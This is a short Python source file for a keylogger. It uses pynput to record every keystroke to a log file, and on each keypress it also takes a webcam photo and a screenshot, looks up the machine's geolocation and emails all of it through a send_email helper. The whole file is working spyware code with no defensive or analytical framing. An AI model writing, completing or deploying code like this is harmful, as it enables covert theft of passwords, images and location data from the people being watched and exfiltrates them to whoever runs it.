import os
import threading
from pynput import keyboard
from utils.webcam_capture import capture_webcam
from utils.screenshot import take_screenshot
from utils.geolocation import get_location  
from email_sender import send_email

LOG_FILE = "logs/keystrokes.log"
os.makedirs("logs", exist_ok=True)

def on_press(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

    # ✅ Capture webcam and screenshot
    webcam_path = capture_webcam()
    screenshot_path = take_screenshot("logs/screenshots")  
    # ✅ Get location (latitude, longitude)
    latlng = get_location()
    location_str = f"Location: {latlng}" if latlng else "Location: Unavailable"

    # ✅ Send the email with attachments and location
    send_email(
        subject="🔐 Keylogger Alert",
        body=f"New keystroke captured.\n{location_str}",
        attachments=[screenshot_path, webcam_path, LOG_FILE]
    )

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
